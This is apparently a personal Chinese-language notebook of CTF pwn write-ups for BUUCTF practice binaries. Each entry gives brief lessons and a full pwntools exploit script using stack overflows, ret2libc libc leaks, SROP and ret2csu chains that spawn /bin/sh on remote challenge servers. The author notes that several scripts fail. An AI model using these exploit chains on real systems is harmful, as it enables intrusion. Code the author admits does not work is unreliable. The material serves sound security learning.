### 1    ciscn_2019_c_1

### 考点：ret2libc+strlen()绕过

![[Pasted image 20240912223254.png]]

![[Pasted image 20240912223454.png]]

![[Pasted image 20240912223516.png]]

收获：
1.在这一题中我学到了通过输入"\\\0"字符可以截断strlen()函数的读取，在这一题里面可以直接用这种方法去绕过加密。
2.scanf和gets函数接收和停止输入的标准。
   scanf`函数的输入结束符是空白字符，也就是空格、制表符、和换行符这些，而`gets`函数的输入结束符是回车换行符。另外值得注意的就是用`scanf`函数输入字符串时，它是从第一个非空白字符开始读取，而`gets`函数无这个特性。
3.puts函数会自带一个换行符。这也就是为什么要接收\\n后再接收泄露地址。
4.这种题本地泄露的函数地址和远程泄露的函数地址不一样。得出来的libc的版本也不一样。

```
from pwn import*
from LibcSearcher import LibcSearcher

def init(file1,file2,x):
    if file2:
        if x:
            return process(file1),ELF(file1),ELF(file2)
        else:
            return remote("node5.buuoj.cn",29300),ELF(file1),ELF(file2)
    else:
        if x:
            return process(file1),ELF(file1)
        else:
            return remote("node5.buuoj.cn",26832),ELF(file1)

p,elf=init("./ciscn_2019_c_1",0,0)

  

def log(a,b,c):
    if a:
        context.log_level="debug"
    if b:
        context.os='linux'
    if c:
        context.arch='amd64'  
        
log(0,1,1)

  
def real(name1,name2):
    if name1:
        plt=elf.plt[name1]
        got=elf.got[name1]
        sym=elf.symbols[name2]
        return plt,got,sym

plt,got,sym=real("puts","main")

r = lambda x: p.recv(x)
ru = lambda str: p.recvuntil(str)
rul1 =lambda : u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
rul2 = lambda : u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda a,b: p.sendafter(a,b)
sla = lambda a,b: p.sendlineafter(a,b)
libc_base = lambda addr,name:addr-libc.dump(name)
go = lambda : p.interactive()

rdi=0x0000000000400c83
ret=0x00000000004006b9

ru("Input your choice!\n")
sl(b"1")
ru(b"Input your Plaintext to be encrypted\n")
sl(b"\0"+cyclic(0x50+7)+p64(rdi)+p64(got)+p64(plt)+p64(sym)+p64(ret))

p.recvuntil(b"\n")
p.recvuntil(b"\n")

via=rul2()
print(hex(via))

libc=LibcSearcher("puts",via)
libc_base=libc_base(via,"puts")

system=libc_base+0x000000000004f440
binsh=libc_base+0x1b3e9a

ru("Input your choice!\n")
sl(b"1")
ru("Input your Plaintext to be encrypted\n")
s(b"\0"+cyclic(0x57)+p64(rdi)+p64(binsh)+p64(ret)*5+p64(system))

go()
```


[[BUUCTF]PWN6——ciscn_2019_c_1_bugkuctf-pwn题pwn6-CSDN博客](https://blog.csdn.net/mcmuyanga/article/details/108224907)


### 2    cmcc_pwnme1

### 考点：scanf溢出，printf打印
![[Pasted image 20240913223838.png]]
![[Pasted image 20240913224229.png]]


收获：这一题有问题，我在运行了自己的代码和网站上所有人的代码发现是都打不通，不知道为什么。这一题放在这里。下面是我自己写的wp,但是没打通。

wp
```
from pwn import*

from LibcSearcher import LibcSearcher

def init(file1,file2,x):

    if file2:

        if x:

            return process(file1),ELF(file1),ELF(file2)

        else:

            return remote("node5.buuoj.cn",29300),ELF(file1),ELF(file2)

    else:

        if x:

            return process(file1),ELF(file1)

        else:

            return remote("node5.buuoj.cn",28096),ELF(file1)

p,elf=init("./pwnme1",0,1)

  

def log(a,b,c):

    if a:

        context.log_level="debug"

    if b:

        context.os='linux'

    if c:

        context.arch='amd64'  

log(1,1,1)

  

def real(name1,name2,name3):

    if name1:

        plt=elf.plt[name1]

        got=elf.got[name3]

        sym=elf.symbols[name2]

        return plt,got,sym

plt,got,sym=real("puts","main","printf")

context.terminal = ['xterm', '-e']

def debug():

    attach(p)

  

# debug()

r = lambda x: p.recv(x)

ru = lambda str: p.recvuntil(str)

rul1 =lambda : u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))

rul2 = lambda : u32(p.recvuntil('\xf7')[-4:].ljust(4,b"\x00"))

rl = lambda : p.recvline()

# rul2 = lambda : u32(p.recv(4))

  

s = lambda str: p.send(str)

sl = lambda str: p.sendline(str)

sa = lambda a,b: p.sendafter(a,b)

sla = lambda a,b: p.sendlineafter(a,b)

libc_base = lambda addr,name:addr-libc.dump(name)

go = lambda : p.interactive()

  

# Gadgets information

# ============================================================

# 0x080485f3 : pop ebp ; ret

# 0x080485f2 : pop ebx ; pop ebp ; ret

# 0x08048895 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret

# 0x08048897 : pop edi ; pop ebp ; ret

# 0x08048896 : pop esi ; pop edi ; pop ebp ; ret

# 0x08048476 : ret

  

# Unique gadgets found: 6

  

ret=0x08048476

  

ru(">> 6. Exit")

s("5")

# ru(b"Please input the name of fruit:")

sl(cyclic(0xa4+4)+p32(plt)+p32(sym)+p32(got))

  

rl()

  

via=rul2()

print(hex(via))

libc=LibcSearcher("printf",via)

  

libc_base=libc_base(via,"printf")

  

system=libc_base+libc.dump("system")

binsh=libc_base+libc.dump("str_bin_sh")

  

ru(">> 6. Exit")

sl(b"5")

# ru("Please input the name of fruit:")

sl(cyclic(0xa4+4)+p32(system)+p32(sym)+p32(binsh))

  

go()
```

### 3    _2018_rop

### 考点：read溢出，write泄露libc

![[Pasted image 20240915221046.png]]

![[Pasted image 20240915221114.png]]
收获：
这一题学到了如何实现和put函数一样的功能，write函数在泄露libc的时候就可以依据write的函数的源码看，就如这个里面的第一个参数就是1，第二个就是你想输出的东西，这里可以填如got地址，第三个参数就是你想输出的字节数。

但是这一题也是有问题，打不通。。。。
以下附上我的源码。


wp
```
from pwn import*

from LibcSearcher import LibcSearcher

def init(file1,file2,x):

    if file2:

        if x:

            return process(file1),ELF(file1),ELF(file2)

        else:

            return remote("node5.buuoj.cn",25696),ELF(file1),ELF(file2)

    else:

        if x:

            return process(file1),ELF(file1)

        else:

            return remote("node5.buuoj.cn",26192),ELF(file1)

p,elf=init("./2018_rop",0,0)

  

def log(a,b,c):

    if a:

        context.log_level="debug"

    if b:

        context.os='linux'

    if c:

        context.arch='amd64'  

log(1,1,1)

  

def real(name1,name2,name3):

    if name1:

        plt=elf.plt[name1]

        got=elf.got[name3]

        sym=elf.symbols[name2]

        return plt,got,sym

plt,got,sym=real("write","write","read")

# context.terminal = ['xterm', '-e']

def debug():

    attach(p)

  

# debug()

r = lambda x: p.recv(x)

ru = lambda str: p.recvuntil(str)

rul1 =lambda : u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))

rul2 = lambda : u32(p.recvuntil('\xf7')[-4:].ljust(4,b"\x00"))

rl = lambda : p.recvline()

# rul2 = lambda : u32(p.recv(4))

  

s = lambda str: p.send(str)

sl = lambda str: p.sendline(str)

sa = lambda a,b: p.sendafter(a,b)

sla = lambda a,b: p.sendlineafter(a,b)

libc_base = lambda addr,name:addr-libc.dump(name)

go = lambda : p.interactive()

  
  

# 0x08048443 : pop ebp ; ret

# 0x08048442 : pop ebx ; pop ebp ; ret

# 0x0804855c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret

# 0x08048344 : pop ebx ; ret

# 0x0804855e : pop edi ; pop ebp ; ret

# 0x0804855d : pop esi ; pop edi ; pop ebp ; ret

# 0x08048199 : ret

  

pay=cyclic(0x8c)+p32(plt)+p32(sym)+p32(1)+p32(got)+p32(4)

sl(pay)

  

via=rul2()

print(hex(via))

libc=LibcSearcher("write",via)

  

libc_base=libc_base(via,"write")

  

system=libc_base+libc.dump("system")

binsh=libc_base+libc.dump("str_bin_sh")

  

sl(cyclic(0x8c)+p32(system)+p32(0x8048199)+p32(sym)+p32(binsh))

  

go()
```






### 4    [HarekazeCTF2019]baby_rop2

### 考点：read溢出，printf泄露libc，但是printf.got用不了


![[Pasted image 20240911205107.png]]

收获：有病的题目，不知道为什么printf.got用不了，sb题。
文件在后，homa下，可以用find -name "flag"找到。

wp
```
from pwn import*

from LibcSearcher import LibcSearcher

def init(file1,file2,x):

    if file2:

        if x:

            return process(file1),ELF(file1),ELF(file2)

        else:

            return remote("node5.buuoj.cn",28139),ELF(file1),ELF(file2)

    else:

        if x:

            return process(file1),ELF(file1)

        else:

            return remote("node5.buuoj.cn",28139),ELF(file1)

  

def log(a,b,c):

    if a:

        context.log_level="debug"

    if b:

        context.os='linux'

    if c:

        context.arch='amd64'  

  
  

# context.terminal = ['xterm', '-e']

def debug():

    attach(p)

  
  

#----------------------------------------------------

p,elf=init("./babyrop2",0,0)

log(1,1,1)

plt,got,sym=[elf.plt['printf'],elf.got['read'],elf.sym['main']]

# debug()

  

r = lambda x: p.recv(x)

ru = lambda str: p.recvuntil(str)

rul1 =lambda : u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))

rul2 = lambda : u32(p.recvuntil('\xf7')[-4:].ljust(4,b"\x00"))

rl = lambda : p.recvline()

# rul2 = lambda : u32(p.recv(4))

s = lambda str: p.send(str)

sl = lambda str: p.sendline(str)

sa = lambda a,b: p.sendafter(a,b)

sla = lambda a,b: p.sendlineafter(a,b)

libc_base = lambda addr,name:addr-libc.dump(name)

go = lambda : p.interactive()

  

# Gadgets information

# ============================================================

# 0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret

# 0x0000000000400730 : pop r14 ; pop r15 ; ret

# 0x0000000000400732 : pop r15 ; ret

# 0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret

# 0x00000000004005a0 : pop rbp ; ret

# 0x0000000000400733 : pop rdi ; ret

# 0x0000000000400731 : pop rsi ; pop r15 ; ret

# 0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x00000000004004d1 : ret

# 0x0000000000400532 : ret 0x200a

  

# Unique gadgets found: 12

  

pay=cyclic(0x28)+p64(0x0000000000400733)+p64(got)+p64(plt)+p64(sym)

ru("What's your name? ")

sl(pay)

  

via=rul1()

print(hex(via))

libc=LibcSearcher("read",via)

  

libc_base=libc_base(via,"read")

  

system=libc_base+libc.dump("system")

binsh=libc_base+libc.dump("str_bin_sh")

ru("What's your name? ")

sl(cyclic(0x28)+p64(0x0000000000400733)+p64(binsh)+p64(system)+p64(0x4004d1)+p64(sym))

  

go()
```




### 5    picoctf_2018_rop chain

### 考点：修改多个变量值来通过条件限制打印flag

![[Pasted image 20240911211924.png]]

![[Pasted image 20240911211856.png]]

![[Pasted image 20240911211909.png]]

![[Pasted image 20240911211827.png]]

收获：知道了在调用函数时，函数如果有几个参数就要传入几个参数，就像system一样要传入一函数，返回地址可以写在函数和参数之间。

wp

```
from pwn import *

r = remote("node3.buuoj.cn", 26602)

win_function1 = 0x080485CB
win_function2 = 0x080485D8
flag = 0x0804862B

payload = "a" * 0x1c
payload += p32(win_function1)
payload += p32(win_function2) + p32(flag) + p32(0xBAAAAAAD) + p32(0xDEADBAAD)
#是32位的，所以是函数1+函数2+参数1+参数2
r.sendlineafter("input> ", payload)

r.interactive()

```



### 6    ciscn_2019_s_3

### 考点：打的是srop或ret2csu,挺好的一题，用ret2libc打不了


做法一：srop
#------------------------------------------------------------------------------------------------------------------------
![[Pasted image 20240916145942.png]]

![[Pasted image 20240916150014.png]]


![[Pasted image 20240916150034.png]]

![[Pasted image 20240916150106.png]]

![[Pasted image 20240916150043.png]]

![[Pasted image 20240916150119.png]]



收获1：
这一题在处理泄露偏移的时候我就处理问题，是这样的，这一题的返回地址是rsp,也即是说
RSP=RIP,因为汇编里面是这这样的，syscall的后面是retn，由于程序中调用完syscall后就直接进行了retn，而且此时rsp == rbp，所以我们payload中p64(main)就对应的是返回地址。
![[Pasted image 20240916152046.png]]

收获2：我学到了，或者说我是又把忘掉了的这个知识复习了回来，我学到了如何去算输入的地址在栈上的哪里。

这一题我们只能输入0x10个字节，加上我们的返回地址也就是0x18个字节，我们输入的地址是buf，也是 0x7fffffffde50，我们可以看到buf的附近0x50个空间的地址，里面有很多是栈上的地址，就是这些0x7fffffff的地址，我们可以泄露出来栈上的地址然后算一下到buf的距离再减去距离，这就可以得到buf的栈地址了，所以我们可以看看下图有几个栈上的地址，我们需要注意的是read是需要输入0x18字节的，也就是说我们的前0x18字节都是被占用的，所以我们便去泄露最近的0x00007fffffffdf98,距离buf就是0x148。

![[Pasted image 20240916154100.png]]
![[Pasted image 20240916154154.png]]

收获3：对于如何使用sigreturnframe，现在更了解了一点，
之前在做simple_srop的时候就发现调用frame的时候前面是先要填入
一个地址，也就是调用sigreturn的地址，如下图simple_srop,我们需要先填入0x401296的地址，然后再调用frame。
![[Pasted image 20240916152908.png]]
但是在这一题里面是不一样的，没有调用sigreturn的函数，只有他的调用号，我做的时候就是直接填的syscall的地址，这是不行的，因为没有调用sigreturn函数，所以frame也就用不了，我学到方法是这样的，可以看到sigreturn的调用号，但是缺少syscall，所以我们就可以再调用一个syscall的地址，这就可以了。也就是我们看到的最后一行的gadget和syacall的地址。

```
payloapayload=flat(("/bin/sh\x00").ljust(0x10,'\x00'),p64(gadget),p64(syscall),bytes(frame))d
```
![[Pasted image 20240916153435.png]]

#------------------------------------------------------------------------------------------------------------------



做法二：ret2csu
#------------------------------------------------------------------------------------------------------------------ 
![[Pasted image 20240916145942.png]]

![[Pasted image 20240916150014.png]]


![[Pasted image 20240916150034.png]]

![[Pasted image 20240916150106.png]]

![[Pasted image 20240916150043.png]]

![[Pasted image 20240916150119.png]]

![[Pasted image 20240916170743.png]]

收获一：
我学到了如何使用ret2csu的打法，以及使用的场景，在这题中是依靠设置好的pop值，然后再move到相应的rdx,rsi,edi中，再调用call，然后设置rax值，然后传bin/sh值，再syscall。

![[Pasted image 20240917215003.png]]

![[Pasted image 20240917215030.png]]
#-----------------------------------------------------------------------------------------------------------------



感悟：这一题我看到的时候就感觉打ret2libc的可能性不大，试了一下果然打不通，然后就感觉是srop，因为看汇编里面有syscall，然后感觉ret2csu也可以，因为改一下寄存器的值就可以实现调用，但是在这一题里面我对srop的理解及细节更上了一程，这一题和simple_srop的题目有一点相似，但是细节方面还是有很多需要注意的。

srop遇到的问题：
但是奇怪的是我自己算的偏移srop打远程打不通，我算的打本地能打通，我用的网上的偏移能打通远程，但是本地又打不通，很奇怪。


#### ret2csu代码：

```
#coding:utf-8

from pwn import *

context.arch='amd64'

# p=remote('node5.buuoj.cn',29919)

p=process("./ciscn_s_3")

elf=ELF('./ciscn_s_3')

# context.terminal = ['tmux']

  

gadget=0x4004e2

syscall=0x400517

vuln=0x4004ED

pop6=0x40059a

mov=0x400580

  

rdi=0x4005a3

  

p.send(b'a'*0x10+p64(vuln))

# attach(p)

# Gadgets information

# ============================================================

# 0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret

# 0x00000000004005a0 : pop r14 ; pop r15 ; ret

# 0x00000000004005a2 : pop r15 ; ret

# 0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret

# 0x0000000000400440 : pop rbp ; ret

# 0x00000000004005a3 : pop rdi ; ret

# 0x00000000004005a1 : pop rsi ; pop r15 ; ret

# 0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x00000000004003a9 : ret

  

# binsh=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x118

#上面的是打远程的地址

binsh=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x148

#上面的是打本地地址

  

print(hex(binsh))

  

payload=flat(('/bin/sh\x00').ljust(0x10,'\x00'),p64(pop6),p64(0),p64(0),p64(binsh+0x50),p64(0)*3,p64(mov),p64(gadget),p64(rdi),p64(binsh),p64(syscall))

  

p.send(payload)

  

p.interactive()
```


#### srop代码:
```
from pwn import *

context.arch='amd64'

# p=remote('node5.buuoj.cn',26988)

p=process("./ciscn_s_3")

elf=ELF('./ciscn_s_3')

# context.terminal = ['tmux']

  

gadget=0x4004DA

syscall=0x400517

vuln=0x4004ED

p.send(b'a'*0x10+p64(vuln))

# attach(p)

  

# binsh=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x118

#上面的是打远程的地址

binsh=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x148

#上面的是打本地地址

  

print(hex(binsh))

  

frame=SigreturnFrame()

frame.rax=59

frame.rdi=binsh

frame.rip=syscall

frame.rsi=0

frame=bytes(frame)

payload=flat(("/bin/sh\x00").ljust(0x10,'\x00'),p64(gadget),p64(syscall),bytes(frame))

p.send(payload)

  

p.interactive()
```


### 7    ret2csu1
考点：execve的另一种参数方式，ret2csu的使用。

![[Pasted image 20240918123249.png]]

![[Pasted image 20240918123312.png]]

![[Pasted image 20240918123523.png]]

![[Pasted image 20240918123408.png]]
![[Pasted image 20240918123429.png]]

![[Pasted image 20240918123453.png]]


wp 
```
#coding:utf-8

from pwn import *

context.arch='amd64'

p=remote('node5.buuoj.cn',25869)

# p=process("./pwn")

elf=ELF('./pwn')

# context.terminal = ['tmux']

# attach(p)

gad1_address = 0x40072A

gad2_address = 0x400710

syscall_59 =  0x601068

gift_1_bin_cat = 0x4007BB

gift_2 = 0x601050

  

payload = b"A"*(0x20 + 0x8) + p64(gad1_address) + p64(0) + p64(0) + p64(syscall_59) + p64(gift_1_bin_cat) + p64(gift_2) + p64(0) + p64(gad2_address)

p.send(payload)

# 0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret

# 0x0000000000400730 : pop r14 ; pop r15 ; ret

# 0x0000000000400732 : pop r15 ; ret

# 0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret

# 0x0000000000400528 : pop rbp ; ret

# 0x0000000000400733 : pop rdi ; ret

# 0x0000000000400731 : pop rsi ; pop r15 ; ret

# 0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

# 0x000000000040049e : ret

# 0x0000000000400677 : ret 0x28

# 0x0000000000400696 : ret 0x3b

# 0x00000000004006ad : ret 0x70

  

# Gadgets information

# ============================================================

# 0x00000000004006c0 : leave ; ret

# 0x000000000040049e : ret

# 0x0000000000400677 : ret 0x28

# 0x0000000000400696 : ret 0x3b

# 0x00000000004006ad : ret 0x70

p.interactive()
```
### 8    ret2csu2
![[Pasted image 20240918124201.png]]
![[Pasted image 20240918124310.png]]
![[Pasted image 20240918124103.png]]

![[Pasted image 20240918124143.png]]
![[Pasted image 20240918124124.png]]



### 9    



10    

11    

12    

13    

14    

15    

16    

17    

18    

19    

20    

21    

22    

23    

24    

25    
